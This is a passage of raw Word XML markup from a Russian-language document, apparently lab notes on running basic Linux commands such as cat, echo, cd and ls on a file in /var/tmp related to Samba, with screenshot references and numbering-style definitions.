          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Основной текст"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:bidi w:val="0"/>
        <w:ind w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>cat /var/tmp/samba.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Основной текст"/>
        <w:ind w:left="144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i w:val="1"/>
          <w:iCs w:val="1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tab/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Выполнение команды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cat /var/tmp/samba.txt</w:t>
      </w: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tab/>
      </w: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281488" cy="2389667"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741847" name="officeArt object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3.png" descr="image3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23896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tab/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Основной текст"/>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1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tab/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Выполнение команд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s-ES_tradnl"/>
        </w:rPr>
        <w:t xml:space="preserve">data, echo, cd /var/tmp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и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 xml:space="preserve"> ls</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff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401581</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="line">
              <wp:posOffset>245160</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4383449" cy="2439959"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapTopAndBottom distT="152400" distB="152400"/>
            <wp:docPr id="107374184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449" cy="24399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 xml:space="preserve"> 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</w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:sectPr>
      <w:headerReference w:type="default" r:id="rId28"/>
      <w:footerReference w:type="default" r:id="rId29"/>
      <w:pgSz w:w="11900" w:h="16840" w:orient="portrait"/>
      <w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720"/>
      <w:pgNumType w:start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Roboto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Импортированный стиль 1"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="1">
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:styleLink w:val="Импортированный стиль 1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Импортированный стиль 2"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="3">
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:styleLink w:val="Импортированный стиль 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Импортированный стиль 3"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="5">
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:styleLink w:val="Импортированный стиль 3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Импортированный стиль 4"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="7">
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:styleLink w:val="Импортированный стиль 4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Импортированный стиль 5"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="9">
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:styleLink w:val="Импортированный стиль 5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Импортированный стиль 6"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="11">
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:styleLink w:val="Импортированный стиль 6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Импортированный стиль 7"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="13">
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:styleLink w:val="Импортированный стиль 7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numStyleLink w:val="Импортированный стиль 8"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="15">
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:styleLink w:val="Импортированный стиль 8"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:suff w:val="tab"/>
      <w:lvlText w:val="●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○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■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●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○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■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●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○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■"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="72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11"/>
  </w:num>
  <w:num w:numId="12">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="13">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="14">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="15">
    <w:abstractNumId w:val="15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trackRevisions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left"/>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:cs="Arial Unicode MS" w:hAnsi="Arial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numbering" w:styleId="Импортированный стиль 1">
    <w:name w:val="Импортированный стиль 1"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="1"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="numbering" w:styleId="Импортированный стиль 2">
    <w:name w:val="Импортированный стиль 2"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="3"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="numbering" w:styleId="Импортированный стиль 3">
    <w:name w:val="Импортированный стиль 3"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="5"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="numbering" w:styleId="Импортированный стиль 4">
    <w:name w:val="Импортированный стиль 4"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="7"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="numbering" w:styleId="Импортированный стиль 5">
    <w:name w:val="Импортированный стиль 5"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="9"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="numbering" w:styleId="Импортированный стиль 6">
    <w:name w:val="Импортированный стиль 6"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="11"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="numbering" w:styleId="Импортированный стиль 7">
    <w:name w:val="Импортированный стиль 7"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="13"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="numbering" w:styleId="Импортированный стиль 8">
    <w:name w:val="Импортированный стиль 8"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="15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1.jpeg"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header1.xml"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer1.xml"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/numbering" Target="numbering.xml"/><Relationship Id="rId3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